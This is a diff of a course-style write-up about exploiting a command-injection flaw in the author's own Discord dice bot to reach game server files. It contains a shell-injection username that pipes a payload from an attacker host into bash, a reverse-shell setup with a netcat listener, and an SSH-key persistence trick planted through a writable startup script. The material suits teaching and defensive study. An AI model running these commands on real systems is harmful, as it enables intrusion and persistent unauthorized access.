@@ -1,7 +1,7 @@
 # Exploiting Discord Bot Vulnerability to Gain Access to Game Server Files
 
 
-
+---
 
 
 ## Introduction
@@ -9,7 +9,7 @@ I own a personal server that hosts both a game server and a Discord bot, which p
 
 The Discord bot is a program that continuously listens to messages in a designated chat channel and executes commands or functions depending on the message content.
 
-During a Cybersecurity course, I discovered a vulnerability in the Discord bot’s Python code that allows remote code execution without requiring user interaction. Exploiting this flaw, combined with a misconfiguration in the file permissions of a script, I was able to gain unauthorized access to the game server’s files.
+During a Cybersecurity course, I discovered a vulnerability in the Discord bot’s Python code that allows remote code execution without requiring user interaction. Exploiting this flaw, combined with a misconfiguration in the file permissions of a script, I was able to gain unauthorized access to the game server’s files.  
 
 
 
@@ -28,10 +28,10 @@ The Vulnerability is a line in the code of the funcion "dice" that permits code 
 if message.content.startswith('!dice'):
     dice = random.randint(1,6)
     username = message.author.display_name
-    subprocess.run(f'python3 ./logWriter.py {username} {dice}', shell=True)  <---------
+    subprocess.run(f'python3 ./logWriter.py {username} {dice}', shell=True)  #  <--- Vulnerable code
     await message.channel.send(f"{username}, hai estratto: {dice}")
 ```
-Since the code is executed in a shell, inserting a ; in the username allows the shell to treat what follows as a separate command instead of passing it as a parameter.
+Since the code is executed in a shell, inserting a ; in the username allows the shell to treat what follows as a separate command instead of passing it as a parameter to logWriter.py.
 
 
 ### Misconficuration
@@ -39,16 +39,16 @@ In addition to the code injection vulnerability, the system also presented a mis
 
 Since this script is executed by the game server process running under `user-b`, modifying its content and then restarting the server makes it possible to execute arbitrary code with `user-b`'s privileges, ultimately granting access to the game server files.
 
-
-
+  
+---
 
 
 
 ## Threat model
 - Attacker has access to send messages in the Discord chat monitored by the bot.  
 - Attacker is aware of the injection vulnerability in the bot’s username handling.
-
-
+  
+---
 
 
 
@@ -69,28 +69,30 @@ done
 clear
 nc -lvnp 8081
 ```
-In the response.txt file there is the payload that the attacker wants to execute.
-
-
+In the response.txt file there is the payload that the attacker wants to execute, wich is sent as a response to http get requests to `process 1`.
+  
+---
 
 
 ## Exploit
-The reason I did not inject the entire payload directly through the username is due to the 32-character limit imposed on usernames (including spaces).
-Instead, I set up a remote listener to serve the full payload.
-The exploit consists of injecting a command via the username that instructs the bot to fetch and execute code from a remote response.txt file.
-The username I used to achieve this was:
+The desired payload can not always be injected directly through the username due to the 32-character limit (including spaces).  
+To work around this limitation, a remote listener was set up to serve the full payload.  
+The exploit injects a command in the username that makes the bot fetch and execute code from a remote `response.txt` file.  
+The username used for this injection was:
+
 ```
 ;curl ip-attacker:8080 | bash;
 ```
 
-
-
+  
+---
 
 ## Execution
 
 #### 1)Reverse Shell
 
-To obtain a `reverse shell`, I wrote the following content in `response.txt`:
+The file `response.txt` was created with the following content to establish a reverse shell:
+
 
 ```
 HTTP/1.1 200 OK
@@ -113,20 +115,21 @@ This Python command creates a reverse shell:
 - It starts an interactive `/bin/sh` shell, allowing the attacker to execute commands remotely through the established connection.
 
 #### 2)Listeners
-In order to serve the malicious payload and receive the reverse shell connection, I set up two listener processes on my machine by running the server processes code.
+Two listener processes were set up on the attacker machine by running the corresponding server code to serve the malicious payload and receive the reverse shell connection.
 
 #### 3)Username
-Due to the vulnerability in the bot’s input handling, I modified my Discord username to include a shell injection payload.
+The Discord username was modified to include a shell injection payload due to the vulnerability in the bot’s input handling.  
 The username was set to:
+
 `;curl ip-attacker:8080 | bash;`
 
 #### 4) Triggering the Vulnerability
 
-With the username set, I simply interacted with the bot by sending the command:
-`!dice`
+With the username set, the attacker can trigger the exploit by sending the command `!dice` to the bot.
 
+  
 
-
+---
 
 ## Post-Exploitation
 Once i obtained a reberse shell, and i was able to navigate inside the user-a folder, accessing all doscord bot's files, including user-b's script `server_start.sh`
@@ -136,8 +139,8 @@ Once i obtained a reberse shell, and i was able to navigate inside the user-a fo
 But i did not have access rights to user-b folder, containing the game server's files
 ![Nat Configuration](images/Screenshot_tree.png)
 
-
-
+  
+---
 
 ## Privilege Escalation
 
@@ -179,4 +182,10 @@ echo "echo 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGzTv8FEFTYsiVF7rOQFz/+Zme92Zgdr
 ```
 
 This ensured that, upon the next reboot, the server would automatically add the attacker's public key, granting SSH access as `user-b`.
+  
+----
 
+## Server Restart
+
+After modifying the `server_start.sh` script to include the attacker’s public SSH key, it was necessary to wait for the server to restart in order to trigger the cron job execution.  
+Once the server rebooted, the injected code ran with `user-b` privileges, granting persistent access to the game server files and enabling SSH login as `user-b`.
